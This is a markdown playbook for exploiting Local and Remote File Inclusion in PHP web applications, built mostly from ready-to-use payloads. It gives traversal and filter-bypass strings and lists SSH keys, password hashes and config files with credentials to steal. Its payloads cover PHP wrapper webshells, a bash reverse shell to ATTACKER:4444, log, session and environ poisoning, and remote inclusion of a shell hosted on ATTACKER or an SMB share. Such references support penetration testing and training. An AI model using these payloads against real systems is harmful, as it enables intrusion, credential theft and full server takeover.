# LFI / RFI → RCE Playbook

Complete reference for exploiting Local File Inclusion and Remote File Inclusion vulnerabilities to achieve file reads, source code disclosure, and remote code execution.

---

## Table of Contents

- [Spotting LFI](#spotting-lfi)
- [Basic Path Traversal](#basic-path-traversal)
- [Traversal Filter Bypasses](#traversal-filter-bypasses)
- [Interesting Files to Read](#interesting-files-to-read)
- [PHP Wrappers (LFI → Source Code / RCE)](#php-wrappers)
- [Log Poisoning (LFI → RCE)](#log-poisoning)
- [Session File Poisoning](#session-file-poisoning)
- [/proc/self/environ Injection](#procselfenviron-injection)
- [Upload + Include (LFI → RCE)](#upload--include)
- [PHP Filter Chain RCE](#php-filter-chain-rce)
- [Remote File Inclusion (RFI)](#remote-file-inclusion)
- [Windows-Specific LFI](#windows-specific-lfi)
- [Tools](#tools)
- [Quick Reference](#quick-reference)

---

## Spotting LFI

### Vulnerable Parameters

Any parameter that loads a page, template, file, or language is a candidate:

```
http://TARGET/index.php?page=about
http://TARGET/index.php?file=contact.html
http://TARGET/index.php?view=news
http://TARGET/index.php?include=header
http://TARGET/index.php?template=default
http://TARGET/index.php?lang=en
http://TARGET/index.php?doc=readme
http://TARGET/index.php?path=config
http://TARGET/index.php?folder=images
http://TARGET/index.php?module=dashboard
http://TARGET/download.php?f=report.pdf
http://TARGET/read.php?filename=notes.txt
```

### Quick Test

```bash
# Try reading /etc/passwd (Linux) or a known Windows file
curl "http://TARGET/index.php?page=../../../etc/passwd"
curl "http://TARGET/index.php?page=....//....//....//etc/passwd"
curl "http://TARGET/index.php?page=..%2f..%2f..%2fetc%2fpasswd"

# Windows
curl "http://TARGET/index.php?page=..\..\..\..\windows\system32\drivers\etc\hosts"
curl "http://TARGET/index.php?page=C:\windows\win.ini"
```

**Confirm LFI exists if you see:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### Common Vulnerable PHP Code

```php
// Direct include — classic LFI
<?php include($_GET['page']); ?>
<?php include("pages/" . $_GET['page']); ?>

// With extension appended (need null byte or wrapper to bypass)
<?php include($_GET['page'] . ".php"); ?>
<?php include("lang/" . $_GET['lang'] . ".php"); ?>

// File read
<?php readfile($_GET['file']); ?>
<?php echo file_get_contents($_GET['doc']); ?>

// Require
<?php require($_GET['module']); ?>
```

---

## Basic Path Traversal

### Standard Traversal

```
../../../etc/passwd                    # 3 directories up
../../../../etc/passwd                 # 4 up
../../../../../etc/passwd              # 5 up
../../../../../../etc/passwd           # 6 up — usually enough
```

**If the app prepends a directory:**
```php
// Code: include("pages/" . $_GET['page']);
// Payload:
?page=../../../etc/passwd
// Becomes: include("pages/../../../etc/passwd")  → /etc/passwd
```

**If the app appends an extension:**
```php
// Code: include($_GET['page'] . ".php");
// Null byte (PHP < 5.3.4):
?page=../../../etc/passwd%00
// Path truncation (PHP < 5.3, long paths):
?page=../../../etc/passwd............[repeat to ~4096 chars]
// PHP wrapper (works on modern PHP):
?page=php://filter/convert.base64-encode/resource=../../../etc/passwd
```

### Depth-Agnostic Traversal

Don't know how deep the web root is? Just stack traversals — extras are ignored:

```
../../../../../../../../../../../../../../etc/passwd
```

Going beyond the filesystem root (`/`) just stays at `/`, so over-traversing is safe.

---

## Traversal Filter Bypasses

### When `../` is Stripped

```bash
# Double traversal (app removes ../ once, leaving ../)
....//....//....//etc/passwd
..../....//....//etc/passwd

# Alternate separators
..%2f..%2f..%2fetc%2fpasswd           # URL-encoded /
..%252f..%252f..%252fetc%252fpasswd   # double URL-encoded /
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd  # UTF-8 overlong encoding
..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd  # Unicode fullwidth /

# Backslash (Windows, or apps that normalize)
..\..\..\etc\passwd
..%5c..%5c..%5cetc%5cpasswd           # URL-encoded \
```

### When Path Must Start With a Specific Directory

```php
// Code: if(strpos($_GET['page'], 'pages/') !== 0) die();
// Bypass:
?page=pages/../../../etc/passwd
?page=pages/....//....//....//etc/passwd
```

### When Extension is Forced

```php
// Code: include($_GET['page'] . ".php");

// Null byte (PHP < 5.3.4)
?page=../../../etc/passwd%00

// Path truncation (PHP < 5.3 on Windows, 256+ chars)
?page=../../../etc/passwd/./././././[...repeat to ~4096 chars]

// Wrappers (modern PHP — preferred method)
?page=php://filter/convert.base64-encode/resource=../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index
# ^ reads index.php source without executing it
```

### Other Bypass Techniques

```bash
# Using absolute path (if no traversal check, just extension check)
?page=/etc/passwd%00
?page=/etc/passwd

# Using dot-segment normalization
?page=/var/www/html/pages/../../../etc/passwd

# Encoding tricks
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd   # full URL encode
?page=..%c0%ae/..%c0%ae/etc/passwd                 # overlong dot
?page=..%252e/..%252e/etc/passwd                    # double-encoded dot
```

---

## Interesting Files to Read

### Linux

```bash
# System
/etc/passwd                    # users
/etc/shadow                    # password hashes (usually not readable)
/etc/hostname                  # hostname
/etc/hosts                     # host mappings
/etc/crontab                   # scheduled tasks
/etc/issue                     # OS banner
/etc/os-release                # distro info

# SSH
/home/<user>/.ssh/id_rsa       # private keys
/home/<user>/.ssh/authorized_keys
/root/.ssh/id_rsa

# Web server configs (find vhosts, other apps, auth files)
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/apache2/sites-enabled/*.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/httpd/conf/httpd.conf
/var/www/html/.htpasswd

# App configs (credentials)
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/.env
/var/www/html/configuration.php          # Joomla
/var/www/html/app/etc/local.xml          # Magento
/var/www/html/sites/default/settings.php # Drupal
/var/www/html/include/config.inc.php     # phpMyAdmin
/opt/bitnami/apps/*/conf/*.conf

# Process info
/proc/self/environ                       # environment variables
/proc/self/cmdline                       # how current process was started
/proc/self/fd/0-15                       # open file descriptors
/proc/self/status                        # process info
/proc/version                            # kernel version
/proc/net/tcp                            # open connections
/proc/sched_debug                        # running processes

# Logs (for log poisoning — see below)
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log                        # SSH login attempts
/var/log/mail.log
/var/log/vsftpd.log
/var/log/syslog

# Bash history
/home/<user>/.bash_history
/root/.bash_history

# Database configs
/etc/mysql/my.cnf
/etc/postgresql/*/main/pg_hba.conf
```

### Windows

```bash
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM            # requires SYSTEM priv
C:\Windows\repair\SAM
C:\Windows\System32\config\SYSTEM
C:\Users\<user>\Desktop\proof.txt
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\W3SVC1\*.log
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\php\php.ini
C:\xampp\htdocs\config.php
C:\xampp\passwords.txt
C:\xampp\mysql\data\mysql\user.MYD
C:\Users\<user>\.ssh\id_rsa
C:\ProgramData\MySQL\MySQL Server *\my.ini
C:\Windows\debug\NetSetup.log
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\unattend\Unattend.xml
C:\Windows\system.ini
C:\boot.ini
```

---

## PHP Wrappers

PHP wrappers turn a file-read LFI into source code disclosure or direct RCE.

### php://filter — Read Source Code

Reads PHP files as base64 **without executing them**. The most important wrapper.

```bash
# Read index.php source
?page=php://filter/convert.base64-encode/resource=index
?page=php://filter/convert.base64-encode/resource=index.php

# Read config files
?page=php://filter/convert.base64-encode/resource=config
?page=php://filter/convert.base64-encode/resource=../config
?page=php://filter/convert.base64-encode/resource=../../wp-config

# Decode the output
echo "BASE64_OUTPUT" | base64 -d
```

**Other filter chains (if base64 is blocked):**
```bash
# ROT13
?page=php://filter/read=string.rot13/resource=index.php

# UTF-16 conversion (bypasses some WAFs)
?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php

# Zlib compression
?page=php://filter/zlib.deflate/resource=index.php
# Decompress: php -r "echo gzinflate(file_get_contents('php://stdin'));"

# Chain multiple filters
?page=php://filter/read=string.rot13|convert.base64-encode/resource=index.php
```

### php://input — POST Body Execution (RCE)

Executes PHP code sent in the POST body. Requires `allow_url_include = On`.

```bash
# Test
curl -X POST "http://TARGET/index.php?page=php://input" \
  -d '<?php system("id"); ?>'

# Reverse shell
curl -X POST "http://TARGET/index.php?page=php://input" \
  -d '<?php system("bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\""); ?>'

# Write a persistent webshell
curl -X POST "http://TARGET/index.php?page=php://input" \
  -d '<?php file_put_contents("cmd.php", "<?php system(\$_GET[\"cmd\"]); ?>"); ?>'
```

### data:// — Inline Code Execution (RCE)

Embeds code directly in the URL. Requires `allow_url_include = On`.

```bash
# Basic execution
?page=data://text/plain,<?php system("id"); ?>

# Base64 encoded (bypass WAFs)
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
# Decodes to: <?php system($_GET['cmd']); ?>
# Full URL:
http://TARGET/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id

# Generate base64 payloads
echo -n '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

echo -n '<?php system("id"); ?>' | base64
# PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==
```

### expect:// — Direct Command Execution (RCE)

Runs OS commands directly. Requires `expect` extension (rarely enabled).

```bash
?page=expect://id
?page=expect://whoami
?page=expect://ls+-la
```

### zip:// and phar:// — Archive-Based RCE

Upload a zip/phar containing a PHP file, then include it via wrapper.

```bash
# Create a zip with a PHP shell inside
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.zip shell.php

# Upload shell.zip (via any upload functionality)
# Include via zip wrapper:
?page=zip:///var/www/html/uploads/shell.zip%23shell.php&cmd=id
#          ^-- path to zip               ^-- file inside zip

# phar:// (similar concept)
# Create: pharcc or PHP script to build .phar
?page=phar:///var/www/html/uploads/shell.phar/shell.php&cmd=id
```

---

## Log Poisoning

Inject PHP code into a log file, then include the log via LFI. The PHP code executes when the log is included.

### Apache Access Log

```bash
# 1. Inject PHP into the User-Agent header
curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/

# 2. Include the access log
curl "http://TARGET/index.php?page=../../../var/log/apache2/access.log&cmd=id"

# Common log paths:
/var/log/apache2/access.log          # Debian/Ubuntu
/var/log/apache/access.log           # Some distros
/var/log/httpd/access_log            # RHEL/CentOS
/usr/local/apache2/logs/access_log
/var/log/nginx/access.log
/opt/lampp/logs/access_log
C:\xampp\apache\logs\access.log      # Windows XAMPP
```

### Apache Error Log

```bash
# Trigger an error with PHP in the request
curl "http://TARGET/<?php system(\$_GET['cmd']); ?>"
# This creates a 404 with our PHP in the error log

# Include the error log
curl "http://TARGET/index.php?page=../../../var/log/apache2/error.log&cmd=id"
```

### SSH Log (auth.log)

```bash
# 1. Inject PHP via SSH username (it gets logged in auth.log)
ssh '<?php system($_GET["cmd"]); ?>'@TARGET
# This fails to authenticate but logs the "username"

# 2. Include the auth log
curl "http://TARGET/index.php?page=../../../var/log/auth.log&cmd=id"
```

### Mail Log

```bash
# 1. Send mail with PHP in the body or subject
# (requires sendmail/mail to be available)
telnet TARGET 25
HELO attacker
MAIL FROM: <attacker@evil.com>
RCPT TO: <www-data@TARGET>
DATA
<?php system($_GET['cmd']); ?>
.
QUIT

# 2. Include the mail log
curl "http://TARGET/index.php?page=../../../var/log/mail.log&cmd=id"
```

### FTP Log

```bash
# 1. Connect to FTP with PHP as username
ftp TARGET
Name: <?php system($_GET['cmd']); ?>
Password: anything

# 2. Include the FTP log
curl "http://TARGET/index.php?page=../../../var/log/vsftpd.log&cmd=id"
```

---

## Session File Poisoning

PHP sessions are stored as files. If you can control session data and know the session file path, include it.

```bash
# 1. Set a session variable with PHP code
# (find a page that stores user input in $_SESSION)
curl "http://TARGET/login.php" -d "username=<?php system(\$_GET['cmd']); ?>" -c cookies.txt

# 2. Get your session ID from the cookie
cat cookies.txt
# PHPSESSID=abc123def456

# 3. Include the session file
# Default session paths:
/var/lib/php/sessions/sess_abc123def456
/var/lib/php5/sessions/sess_abc123def456
/tmp/sess_abc123def456
C:\Windows\Temp\sess_abc123def456

curl "http://TARGET/index.php?page=../../../var/lib/php/sessions/sess_abc123def456&cmd=id"
```

---

## /proc/self/environ Injection

The `/proc/self/environ` file contains environment variables, including the `HTTP_USER_AGENT` header.

```bash
# 1. Send a request with PHP in the User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" \
  "http://TARGET/index.php?page=../../../proc/self/environ&cmd=id"

# This works because:
# - LFI includes /proc/self/environ
# - environ contains: HTTP_USER_AGENT=<?php system(...); ?>
# - PHP parses and executes the embedded code
```

**Note:** Requires the web server process to have read access to `/proc/self/environ` (often restricted on modern systems).

---

## Upload + Include

Combine a file upload with LFI for reliable RCE. Works even if uploads aren't directly accessible.

```bash
# 1. Upload a PHP file disguised as an image (see upload-attacks playbook)
#    Upload to: /var/www/html/uploads/avatar.jpg
#    Content: GIF89a<?php system($_GET['cmd']); ?>

# 2. Include it via LFI
curl "http://TARGET/index.php?page=../uploads/avatar.jpg&cmd=id"

# The PHP engine parses the included file and executes the PHP code
# regardless of the .jpg extension
```

**With zip wrapper (if direct include doesn't execute):**
```bash
# Upload evil.zip containing shell.php
curl "http://TARGET/index.php?page=zip://uploads/evil.zip%23shell.php&cmd=id"
```

---

## PHP Filter Chain RCE

The most powerful modern LFI-to-RCE technique. Uses chained `php://filter` conversions to generate arbitrary PHP code **without writing to any file or log**. Works on modern PHP (7.x, 8.x) even with `allow_url_include = Off`.

### Using php_filter_chain_generator

```bash
# Install the tool
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator

# Generate a chain that produces <?php system($_GET['cmd']); ?>
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
# Output: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...[long chain]

# Use it
curl "http://TARGET/index.php?page=php://filter/convert.iconv...[chain]&cmd=id"
```

### Using wrapwrap

```bash
# Alternative tool for filter chain generation
git clone https://github.com/ambionics/wrapwrap
cd wrapwrap

python3 wrapwrap.py --help
```

### Why This Works

PHP's `convert.iconv` filters can be chained to produce specific byte sequences from empty input. By stacking hundreds of character encoding conversions, you build arbitrary PHP code character by character. The resulting filter chain URL is very long but works against any LFI that passes user input to `include()`.

---

## Remote File Inclusion

RFI loads a file from an external server. Requires `allow_url_include = On` (off by default since PHP 5.2).

```bash
# 1. Host a PHP shell on your server
echo '<?php system($_GET["cmd"]); ?>' > shell.php
python3 -m http.server 80

# 2. Include it remotely
curl "http://TARGET/index.php?page=http://ATTACKER/shell.php&cmd=id"

# If .php extension is appended by the app:
# Host as shell.txt or use a null byte:
?page=http://ATTACKER/shell.txt%00
?page=http://ATTACKER/shell.txt?

# Using FTP (sometimes allowed when HTTP isn't)
# Start: python3 -m pyftpdlib -p 21
?page=ftp://ATTACKER/shell.php

# Using SMB (Windows targets — no allow_url_include needed!)
# Start: impacket-smbserver share . -smb2support
?page=\\ATTACKER\share\shell.php
```

### Check if RFI is Possible

```bash
# Try including a remote URL
?page=http://ATTACKER/test.txt

# If your server gets a hit → RFI works
# If nothing → allow_url_include is Off (stick with LFI techniques)
```

---

## Windows-Specific LFI

### UNC Path Inclusion (RFI Without allow_url_include)

```bash
# Windows can include files via SMB — no PHP config change needed
?page=\\ATTACKER\share\shell.php

# Start SMB server on attacker:
impacket-smbserver share /path/to/shells -smb2support

# This is the best RFI technique on Windows
```

### Windows Log Paths

```bash
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\inetpub\logs\LogFiles\W3SVC1\u_exYYMMDD.log
C:\Windows\System32\LogFiles\W3SVC1\u_exYYMMDD.log
C:\Windows\Temp\
```

### IIS Specific

```bash
# IIS log poisoning
# Logs at: C:\inetpub\logs\LogFiles\W3SVC1\u_exYYMMDD.log
# Inject via URL: GET /<?php system($_GET['cmd']); ?> HTTP/1.1

# web.config read
?page=..\..\..\..\inetpub\wwwroot\web.config

# Machine key extraction (for deserialization attacks)
?page=..\..\..\..\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

---

## Tools

| Tool | Purpose | Command |
|------|---------|---------|
| `php_filter_chain_generator` | Generate filter chain RCE payloads | `python3 php_filter_chain_generator.py --chain '<?php ...'` |
| `wrapwrap` | Alternative filter chain generator | `python3 wrapwrap.py` |
| `LFISuite` | Automated LFI exploitation | `python3 lfisuite.py` |
| `dotdotpwn` | Path traversal fuzzer | `dotdotpwn -m http -h TARGET` |
| `ffuf` | Fuzz LFI parameters | `ffuf -u URL?page=FUZZ -w lfi-list.txt` |
| `Burp Intruder` | Fuzz parameters with LFI wordlists | Use SecLists LFI payloads |
| `kadimus` | Automated LFI scanner + exploiter | `kadimus -u URL?page=` |

### Useful Wordlists (SecLists)

```
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
```

---

## Quick Reference

```
┌──────────────────────────────────────────────────────────────────┐
│                    LFI DETECTION                                 │
│                                                                  │
│  ?page=../../../etc/passwd                                       │
│  ?page=....//....//....//etc/passwd                              │
│  ?page=..%2f..%2f..%2fetc%2fpasswd                              │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│                  PHP WRAPPERS                                    │
│                                                                  │
│  SOURCE READ (always try first):                                 │
│  ?page=php://filter/convert.base64-encode/resource=index         │
│                                                                  │
│  RCE (needs allow_url_include=On):                               │
│  ?page=php://input  + POST: <?php system("id"); ?>               │
│  ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8+    │
│  ?page=expect://id                                               │
│                                                                  │
│  RCE (NO allow_url_include needed):                              │
│  php_filter_chain_generator → filter chain payload               │
│  Log poisoning → include poisoned log                            │
│  Upload + LFI include → webshell                                 │
│  Session poisoning → include session file                        │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│                  LOG POISONING                                   │
│                                                                  │
│  1. Inject: curl -A "<?php system(\$_GET['c']); ?>" TARGET      │
│  2. Include: ?page=../../../var/log/apache2/access.log&c=id      │
│                                                                  │
│  Apache:  /var/log/apache2/access.log                            │
│  Nginx:   /var/log/nginx/access.log                              │
│  SSH:     /var/log/auth.log                                      │
│  FTP:     /var/log/vsftpd.log                                    │
│  Mail:    /var/log/mail.log                                      │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│                BYPASS CHEAT SHEET                                │
│                                                                  │
│  ../ stripped     →  ....//  or  ..%2f                           │
│  .php appended    →  %00  or  php://filter  or  filter chain     │
│  Traversal blocked→  ..%c0%af  or  ..%252f  or  absolute path    │
│  Allowlist check  →  pages/../../../etc/passwd                   │
│  WAF blocking     →  double-encode or iconv chain                │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│                 RFI (REMOTE)                                     │
│                                                                  │
│  Linux:   ?page=http://ATTACKER/shell.php                        │
│  Windows: ?page=\\ATTACKER\share\shell.php  (SMB — best option)  │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

## References

- [HackTricks — File Inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/)
- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [Synacktiv — PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [SecLists — LFI Fuzzing](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
